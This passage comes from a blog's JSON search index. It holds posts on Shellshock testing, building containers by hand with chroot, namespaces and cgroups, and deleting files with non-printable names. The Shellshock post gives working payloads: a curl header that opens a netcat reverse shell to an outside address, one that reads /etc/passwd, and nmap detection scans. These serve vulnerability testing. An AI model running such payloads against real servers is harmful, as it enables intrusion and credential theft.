style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eenv x\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#39; () {:;};\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch5 id=\"exploiting-shellshock-bug\"\u003eExploiting Shellshock Bug\u003c/h5\u003e\n\u003cul\u003e\n\u003cli\u003eA substituted command is executed since the feature ignores the command specified by the user, and instead, it runs that which the ForceCommand defines.\u003c/li\u003e\n\u003cli\u003eThe ignored commands from the user are put in the \u0026ldquo;SSH_ORIGINAL_COMMAND\u0026rdquo; environment variable. If the user\u0026rsquo;s default shell is Bash, the Bash shell will parse the value of the \u0026ldquo;SSH_ORIGINAL_COMMAND\u0026rdquo; environment variable on start-up and run the embedded commands.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch5 id=\"examples-of-shellshock-exploit-commands\"\u003eExamples of Shellshock Exploit Commands\u003c/h5\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e## 1\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ecurl -H \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;X-Frame-Options: () {:;};echo;/bin/nc -e /bin/bash 192.168.y.y 443\u0026#34;\u003c/span\u003e 192.168.x.y/CGI-bin/hello.cgi\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e## 2\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ecurl --insecure 192.168.x.x -H \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;User-Agent: () { :; }; /bin/cat /etc/passwd\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cul\u003e\n\u003cli\u003euse nmap script to test for the vulnerability\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003enmap -sV -p- --script http-shellshock 192.168.x.x\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003enmap -sV -p- --script http-shellshock --script-args uri\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e/cgi-bin/bin,cmd\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003els 192.168.x.x\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","tags":["URL","Linux","SHELL","command line"],"title":"Test Whether a Server Is Vulnerable to Shellshock Bug"},{"categories":["URL","Linux","container"],"contents":" Containers from scratch Container file systems $ wget https://github.com/ericchiang/containers-from-scratch/releases/download/v0.1.0/rootfs.tar.gz $ sha256sum rootfs.tar.gz c79bfb46b9cf842055761a49161831aee8f4e667ad9e84ab57ab324a49bc828c rootfs.tar.gz $ # tar needs sudo to create /dev files and setup file ownership $ sudo tar -zxf rootfs.tar.gz $ ls rootfs bin dev home lib64 mnt proc run srv tmp var boot etc lib media opt root sbin sys usr $ ls -al rootfs/bin/ls -rwxr-xr-x. 1 root root 118280 Mar 14 2015 rootfs/bin/ls chroot it allows us to restrict a process\u0026rsquo; view of the file system. In this case, we\u0026rsquo;ll restrict our process to the \u0026ldquo;rootfs\u0026rdquo; directory then exec a shell.\n$ sudo chroot rootfs /bin/bash root@localhost:/# ls / bin dev home lib64 mnt proc run srv tmp var boot etc lib media opt root sbin sys usr root@localhost:/# which python /usr/bin/python root@localhost:/# /usr/bin/python -c \u0026#39;print \u0026#34;Hello, container world!\u0026#34;\u0026#39; Hello, container world! root@localhost:/# When we execute the Python interpreter, we\u0026rsquo;re executing rootfs/usr/bin/python, not the host\u0026rsquo;s Python.\nCreating namespaces with unshare $ sudo unshare -p -f --mount-proc=$PWD/rootfs/proc \\ chroot rootfs /bin/bash root@localhost:/# ps aux USER PID %CPU %MEM VSZ RSS TTY STAT START TIME COMMAND root 1 0.0 0.0 20268 3240 ? S 22:34 0:00 /bin/bash root 2 0.0 0.0 17504 2096 ? R+ 22:34 0:00 ps aux root@localhost:/# In this case, we\u0026rsquo;ll create a PID namespace for the shell, then execute the chroot like the last example.\nEntering namespaces with nsenter Let\u0026rsquo;s find the shell running in a chroot from our last example. $ # From the host, not the chroot. $ ps aux | grep /bin/bash | grep root ... root 29840 0.0 0.0 20272 3064 pts/5 S+ 17:25 0:00 /bin/bash The kernel exposes namespaces under /proc/(PID)/ns as files. In this case, /proc/29840/ns/pid is the process namespace we\u0026rsquo;re hoping to join.\nThe nsenter command provides a wrapper around setns to enter a namespace. We\u0026rsquo;ll provide the namespace file, then run the unshare to remount /proc and chroot to setup a chroot. This time, instead of creating a new namespace, our shell will join the existing one. $ sudo nsenter --pid=/proc/29840/ns/pid \\ unshare -f --mount-proc=$PWD/rootfs/proc \\ chroot rootfs /bin/bash root@localhost:/# ps aux USER PID %CPU %MEM VSZ RSS TTY STAT START TIME COMMAND root 1 0.0 0.0 20272 3064 ? S+ 00:25 0:00 /bin/bash root 5 0.0 0.0 20276 3248 ? S 00:29 0:00 /bin/bash root 6 0.0 0.0 17504 1984 ? R+ 00:30 0:00 ps aux Getting around chroot with mounts First, let\u0026rsquo;s make a new directory to mount into the chroot and create a file there. $ sudo mkdir readonlyfiles $ echo \u0026#34;hello\u0026#34; \u0026gt; readonlyfiles/hi.txt Next, we\u0026rsquo;ll create a target directory in our container and bind mount the directory providing the -o ro argument to make it read-only. $ sudo mkdir -p rootfs/var/readonlyfiles $ sudo mount --bind -o ro $PWD/readonlyfiles $PWD/rootfs/var/readonlyfiles cgroups The kernel exposes cgroups through the /sys/fs/cgroup directory. If your machine doesn\u0026rsquo;t have one you may have to mount the memory cgroup to follow along.\n$ ls /sys/fs/cgroup/ blkio cpuacct cpuset freezer memory net_cls,net_prio perf_event systemd cpu cpu,cpuacct devices hugetlb net_cls net_prio pids Creating a cgroup is easy, just create a directory. In this case we\u0026rsquo;ll create a memory group called \u0026ldquo;demo\u0026rdquo;. Once created, the kernel fills the directory with files that can be used to configure the cgroup.\n$ sudo su # mkdir /sys/fs/cgroup/memory/demo # ls /sys/fs/cgroup/memory/demo/ cgroup.clone_children memory.memsw.failcnt cgroup.event_control memory.memsw.limit_in_bytes cgroup.procs memory.memsw.max_usage_in_bytes memory.failcnt memory.memsw.usage_in_bytes memory.force_empty memory.move_charge_at_immigrate memory.kmem.failcnt memory.numa_stat memory.kmem.limit_in_bytes memory.oom_control memory.kmem.max_usage_in_bytes memory.pressure_level memory.kmem.slabinfo memory.soft_limit_in_bytes memory.kmem.tcp.failcnt memory.stat memory.kmem.tcp.limit_in_bytes memory.swappiness memory.kmem.tcp.max_usage_in_bytes memory.usage_in_bytes memory.kmem.tcp.usage_in_bytes memory.use_hierarchy memory.kmem.usage_in_bytes notify_on_release memory.limit_in_bytes tasks memory.max_usage_in_bytes To adjust a value we just have to write to the corresponding file. Let\u0026rsquo;s limit the cgroup to 100MB of memory and turn off swap.\n# echo \u0026#34;100000000\u0026#34; \u0026gt; /sys/fs/cgroup/memory/demo/memory.limit_in_bytes # echo \u0026#34;0\u0026#34; \u0026gt; /sys/fs/cgroup/memory/demo/memory.swappiness The tasks file is special, it contains the list of processes which are assigned to the cgroup. To join the cgroup we can write our own PID.\n# echo $$ \u0026gt; /sys/fs/cgroup/memory/demo/tasks Finally we need a memory hungry application.\n# hungry.py f = open(\u0026#34;/dev/urandom\u0026#34;, \u0026#34;r\u0026#34;) data = \u0026#34;\u0026#34; i=0 while True: data += f.read(10000000) # 10mb i += 1 print \u0026#34;%dmb\u0026#34; % (i*10,) # python hungry.py 10mb 20mb 30mb 40mb 50mb 60mb 70mb 80mb Killed cgroups can\u0026rsquo;t be removed until every processes in the tasks file has exited or been reassigned to another group. Exit the shell and remove the directory with rmdir (don\u0026rsquo;t use rm -r).\n# exit exit $ sudo rmdir /sys/fs/cgroup/memory/demo Container security and capabilities package main import ( \u0026#34;fmt\u0026#34; \u0026#34;net\u0026#34; \u0026#34;os\u0026#34; ) func main() { if _, err := net.Listen(\u0026#34;tcp\u0026#34;, \u0026#34;:80\u0026#34;); err != nil { fmt.Fprintln(os.Stdout, err) os.Exit(2) } fmt.Println(\u0026#34;success\u0026#34;) } $ go build -o listen listen.go $ ./listen listen tcp :80: bind: permission denied # In this case, CAP_NET_BIND_SERVICE allows executables to listen on lower ports. $ sudo setcap cap_net_bind_service=+ep listen $ getcap listen listen = cap_net_bind_service+ep $ ./listen success For things already running as root, like most containerized apps, we\u0026rsquo;re more interested in taking capabilities away than granting them.\n$ sudo su # capsh --print Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,37+ep Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,37 Securebits: 00/0x0/1\u0026#39;b0 secure-noroot: no (unlocked) secure-no-suid-fixup: no (unlocked) secure-keep-caps: no (unlocked) uid=0(root) gid=0(root) groups=0(root) As an example, we\u0026rsquo;ll use capsh to drop a few capabilities including CAP_CHOWN. If things work as expected, our shell shouldn\u0026rsquo;t be able to modify file ownership despite being root.\n$ sudo capsh --drop=cap_chown,cap_setpcap,cap_setfcap,cap_sys_admin --chroot=$PWD/rootfs -- root@localhost:/# whoami root root@localhost:/# chown nobody /bin/ls chown: changing ownership of \u0026#39;/bin/ls\u0026#39;: Operation not permitted ","date":"November 24, 2022","hero":"/images/hero/linux.png","permalink":"https://linzeyan.github.io/zh-tw/posts/2022/20221124-containers-from-scratch/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://ericchiang.github.io/post/containers-from-scratch/\" target=\"_blank\" rel=\"noopener\"\u003eContainers from scratch\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"container-file-systems\"\u003eContainer file systems\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e$ wget https://github.com/ericchiang/containers-from-scratch/releases/download/v0.1.0/rootfs.tar.gz\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e$ sha256sum rootfs.tar.gz\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ec79bfb46b9cf842055761a49161831aee8f4e667ad9e84ab57ab324a49bc828c  rootfs.tar.gz\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e$ \u003cspan style=\"color:#75715e\"\u003e# tar needs sudo to create /dev files and setup file ownership\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e$ sudo tar -zxf rootfs.tar.gz\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e$ ls rootfs\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ebin   dev  home  lib64  mnt  proc  run   srv  tmp  var\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eboot  etc  lib   media  opt  root  sbin  sys  usr\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e$ ls -al rootfs/bin/ls\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e-rwxr-xr-x. \u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e root root \u003cspan style=\"color:#ae81ff\"\u003e118280\u003c/span\u003e Mar \u003cspan style=\"color:#ae81ff\"\u003e14\u003c/span\u003e  \u003cspan style=\"color:#ae81ff\"\u003e2015\u003c/span\u003e rootfs/bin/ls\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"chroot\"\u003echroot\u003c/h3\u003e\n\u003cp\u003eit allows us to restrict a process\u0026rsquo; view of the file system. In this case, we\u0026rsquo;ll restrict our process to the \u0026ldquo;rootfs\u0026rdquo; directory then exec a shell.\u003c/p\u003e","tags":["URL","Linux","container"],"title":"Containers from scratch"},{"categories":["URL","Linux","SHELL","command line"],"contents":" How to Delete Files With Names That Contain Non-printable Characters ls -l total 13 -rw-r--r-- 1 ZZ 197121 4 Nov 6 07:08 \u0026#39; \u0026#39; -rw-r--r-- 1 ZZ 197121 162 Apr 16 2022 \u0026#39;~$iscord.docx\u0026#39; -rw-r--r-- 1 ZZ 197121 6 Nov 6 06:03 \u0026#39;\u0026#39;$\u0026#39;\\302\\226\u0026#39; -rw-r--r-- 1 ZZ 197121 4 Nov 6 06:01 \u0026#39;\u0026#39;$\u0026#39;\\302\\226\u0026#39;\u0026#39;Λ---ω\u0026#39; -rw-r--r-- 1 ZZ 197121 4 Nov 6 06:13 \u0026#39;␴?␴??␴??::␴?␴\u0026#39; -rw-r--r-- 1 ZZ 197121 4 Nov 6 06:12 ␴__␴ -rw-r--r-- 1 ZZ 197121 4 Nov 6 06:14 ␴␴␴␴␴␴␴␴␴␴␴␴␴␴␴␴␴ -rw-r--r-- 1 ZZ 197121 4 Nov 6 06:18 \u0026#39;␴ω␴␴␣␦\u0026#39;$\u0026#39;\\342\\220\\264\u0026#39; -rw-r--r-- 1 ZZ 197121 4 Nov 6 06:16 ␣␣␣␣␣␣␣␣ -rw-r--r-- 1 ZZ 197121 4 Nov 6 06:26 ␣ μ μ Ω Ω -rw-r--r-- 1 ZZ 197121 14 Nov 6 06:23 \u0026#39;␣ μ ␴\u0026#39;$\u0026#39;\\342\\220\\264\u0026#39;\u0026#39;Ξ\u0026#39; -rw-r--r-- 1 ZZ 197121 4 Nov 6 06:27 -rw-r--r-- 1 ZZ 197121 4 Nov 6 06:27 Using ANSI-C Quoting # Using ANSI-C Quoting rm \u0026#39;\u0026#39;$\u0026#39;\\302\\226\u0026#39; # We can also use the $ special character before enclosing the filename in single quotes rm $\u0026#39;\\356\\200\\215\u0026#39; # pass an item\u0026#39;s name to rm without using the ANSI-C quoting rm \u0026#39;\\026\\033\u0026#39; rm: cannot remove \u0026#39;\\026\\033\u0026#39;: No such file or directory Using Inode Numbers ls -li total 11 ... 6517085 -rw-r--r-- 1 ZZ 197121 4 Nov 6 06:18 \u0026#39;␴ω␴␴␣␦\u0026#39;$\u0026#39;\\342\\220\\264\u0026#39; 7826050 -rw-r--r-- 1 ZZ 197121 3 Nov 9 04:23 \u0026#39;\u0026#39;$\u0026#39;\\356\\200\\215\\356\\200\\215\\356\\200\\215\u0026#39; 4685554 -rw-r--r-- 1 ZZ 197121 4 Nov 6 06:27 we can delete the desired file by passing its inode number to the -inum switch of the find command\nfind . -inum 4685554 -exec rm -i {} \\; rm: remove regular file \u0026#39;./ \u0026#39;? y Using rm Interactive Option With Bash Globbing rm -i * rm: remove regular file \u0026#39; \u0026#39;?y rm: remove regular file \u0026#39; \u0026#39;?y ... Using the Vim Text Editor vim . After choosing the target file, we simply use Shift+D, type y or yes, and hit the Return key to delete it.\n","date":"November 14, 2022","hero":"/images/hero/linux.png","permalink":"https://linzeyan.github.io/zh-tw/posts/2022/20221114-delete-files-non-printable-characters/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://www.baeldung.com/linux/delete-files-non-printable-characters\" target=\"_blank\" rel=\"noopener\"\u003eHow to Delete Files With Names That Contain Non-printable Characters\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003els -l\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003etotal \u003cspan style=\"color:#ae81ff\"\u003e13\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e-rw-r--r-- \u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e ZZ \u003cspan style=\"color:#ae81ff\"\u003e197121\u003c/span\u003e   \u003cspan style=\"color:#ae81ff\"\u003e4\u003c/span\u003e Nov  \u003cspan style=\"color:#ae81ff\"\u003e6\u003c/span\u003e 07:08 \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;      \u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e-rw-r--r-- \u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e ZZ \u003cspan style=\"color:#ae81ff\"\u003e197121\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e162\u003c/span\u003e Apr \u003cspan style=\"color:#ae81ff\"\u003e16\u003c/span\u003e  \u003cspan style=\"color:#ae81ff\"\u003e2022\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;~$iscord.docx\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e-rw-r--r-- \u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e ZZ \u003cspan style=\"color:#ae81ff\"\u003e197121\u003c/span\u003e   \u003cspan style=\"color:#ae81ff\"\u003e6\u003c/span\u003e Nov  \u003cspan style=\"color:#ae81ff\"\u003e6\u003c/span\u003e 06:03 \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;\u0026#39;$\u0026#39;\\302\\226\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e-rw-r--r-- \u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e ZZ \u003cspan style=\"color:#ae81ff\"\u003e197121\u003c/span\u003e   \u003cspan style=\"color:#ae81ff\"\u003e4\u003c/span\u003e Nov  \u003cspan style=\"color:#ae81ff\"\u003e6\u003c/span\u003e 06:01 \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;\u0026#39;$\u0026#39;\\302\\226\u0026#39;\u0026#39;Λ---ω\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e-rw-r--r-- \u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e ZZ \u003cspan style=\"color:#ae81ff\"\u003e197121\u003c/span\u003e   \u003cspan style=\"color:#ae81ff\"\u003e4\u003c/span\u003e Nov  \u003cspan style=\"color:#ae81ff\"\u003e6\u003c/span\u003e 06:13 \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;␴?␴??␴??::␴?␴\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e-rw-r--r-- \u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e ZZ \u003cspan style=\"color:#ae81ff\"\u003e197121\u003c/span\u003e   \u003cspan style=\"color:#ae81ff\"\u003e4\u003c/span\u003e Nov  \u003cspan style=\"color:#ae81ff\"\u003e6\u003c/span\u003e 06:12  ␴__␴\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e-rw-r--r-- \u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e ZZ \u003cspan style=\"color:#ae81ff\"\u003e197121\u003c/span\u003e   \u003cspan style=\"color:#ae81ff\"\u003e4\u003c/span\u003e Nov  \u003cspan style=\"color:#ae81ff\"\u003e6\u003c/span\u003e 06:14  ␴␴␴␴␴␴␴␴␴␴␴␴␴␴␴␴␴\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e-rw-r--r-- \u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e ZZ \u003cspan style=\"color:#ae81ff\"\u003e197121\u003c/span\u003e   \u003cspan style=\"color:#ae81ff\"\u003e4\u003c/span\u003e Nov  \u003cspan style=\"color:#ae81ff\"\u003e6\u003c/span\u003e 06:18 \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;␴ω␴␴␣␦\u0026#39;$\u0026#39;\\342\\220\\264\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e-rw-r--r-- \u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e ZZ \u003cspan style=\"color:#ae81ff\"\u003e197121\u003c/span\u003e   \u003cspan style=\"color:#ae81ff\"\u003e4\u003c/span\u003e Nov  \u003cspan style=\"color:#ae81ff\"\u003e6\u003c/span\u003e 06:16  ␣␣␣␣␣␣␣␣\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e-rw-r--r-- \u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e ZZ \u003cspan style=\"color:#ae81ff\"\u003e197121\u003c/span\u003e   \u003cspan style=\"color:#ae81ff\"\u003e4\u003c/span\u003e Nov  \u003cspan style=\"color:#ae81ff\"\u003e6\u003c/span\u003e 06:26  ␣   μ   μ   Ω  Ω\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e-rw-r--r-- \u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e ZZ \u003cspan style=\"color:#ae81ff\"\u003e197121\u003c/span\u003e  \u003cspan style=\"color:#ae81ff\"\u003e14\u003c/span\u003e Nov  \u003cspan style=\"color:#ae81ff\"\u003e6\u003c/span\u003e 06:23 \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;␣   μ  ␴\u0026#39;$\u0026#39;\\342\\220\\264\u0026#39;\u0026#39;Ξ\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e-rw-r--r-- \u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e ZZ \u003cspan style=\"color:#ae81ff\"\u003e197121\u003c/span\u003e   \u003cspan style=\"color:#ae81ff\"\u003e4\u003c/span\u003e Nov  \u003cspan style=\"color:#ae81ff\"\u003e6\u003c/span\u003e 06:27\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e-rw-r--r-- \u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e ZZ \u003cspan style=\"color:#ae81ff\"\u003e197121\u003c/span\u003e   \u003cspan style=\"color:#ae81ff\"\u003e4\u003c/span\u003e Nov  \u003cspan style=\"color:#ae81ff\"\u003e6\u003c/span\u003e 06:27\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch5 id=\"using-ansi-c-quoting\"\u003eUsing ANSI-C Quoting\u003c/h5\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# Using ANSI-C Quoting\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003erm \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;\u0026#39;$\u0026#39;\\302\\226\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# We can also use the $ special character before enclosing the filename in single quotes\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003erm \u003cspan style=\"color:#e6db74\"\u003e$\u0026#39;\\356\\200\\215\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# pass an item\u0026#39;s name to rm without using the ANSI-C quoting\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003erm \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;\\026\\033\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003erm: cannot remove \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;\\026\\033\u0026#39;\u003c/span\u003e: No such file or directory\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch5 id=\"using-inode-numbers\"\u003eUsing Inode Numbers\u003c/h5\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003els -li\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003etotal \u003cspan style=\"color:#ae81ff\"\u003e11\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e...\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#ae81ff\"\u003e6517085\u003c/span\u003e -rw-r--r-- \u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e ZZ \u003cspan style=\"color:#ae81ff\"\u003e197121\u003c/span\u003e   \u003cspan style=\"color:#ae81ff\"\u003e4\u003c/span\u003e Nov  \u003cspan style=\"color:#ae81ff\"\u003e6\u003c/span\u003e 06:18 \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;␴ω␴␴␣␦\u0026#39;$\u0026#39;\\342\\220\\264\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#ae81ff\"\u003e7826050\u003c/span\u003e -rw-r--r-- \u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e ZZ \u003cspan style=\"color:#ae81ff\"\u003e197121\u003c/span\u003e   \u003cspan style=\"color:#ae81ff\"\u003e3\u003c/span\u003e Nov  \u003cspan style=\"color:#ae81ff\"\u003e9\u003c/span\u003e 04:23 \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;\u0026#39;$\u0026#39;\\356\\200\\215\\356\\200\\215\\356\\200\\215\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#ae81ff\"\u003e4685554\u003c/span\u003e -rw-r--r-- \u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e ZZ \u003cspan style=\"color:#ae81ff\"\u003e197121\u003c/span\u003e   \u003cspan 